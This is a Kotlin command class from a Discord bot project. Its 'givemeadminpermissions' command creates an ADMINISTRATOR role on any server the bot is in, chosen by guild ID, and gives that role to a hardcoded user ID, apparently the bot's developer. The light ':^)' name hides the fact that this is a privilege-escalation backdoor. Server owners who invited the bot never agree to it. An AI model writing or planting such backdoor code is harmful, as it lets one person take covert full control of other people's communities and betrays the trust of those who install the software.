package de.tectoast.emolga.commands.flo

import de.tectoast.emolga.commands.Command
import de.tectoast.emolga.commands.CommandCategory
import de.tectoast.emolga.commands.GuildCommandEvent
import de.tectoast.emolga.utils.Constants
import dev.minn.jda.ktx.messages.Embed
import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.entities.UserSnowflake

class GiveMeAdminPermissionsCommand : Command("givemeadminpermissions", ":^)", CommandCategory.Flo) {
    init {
        argumentTemplate = ArgumentManagerTemplate.builder()
            .add("guild", "Guild-ID", "Die ID des Servers :)", ArgumentManagerTemplate.DiscordType.ID)
            .setExample("!givemeadminpermissions 447357526997073930")
            .build()
    }

    override suspend fun process(e: GuildCommandEvent) {
        val g = e.jda.getGuildById(e.arguments.getID("guild"))
        g!!.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").queue {
            g.addRoleToMember(UserSnowflake.fromId(Constants.FLOID), it).queue()
            e.reply(Embed(title = "Succesfully gave admin permission on \"${g.name}\"!", color = 0xFF0000))
        }
    }
}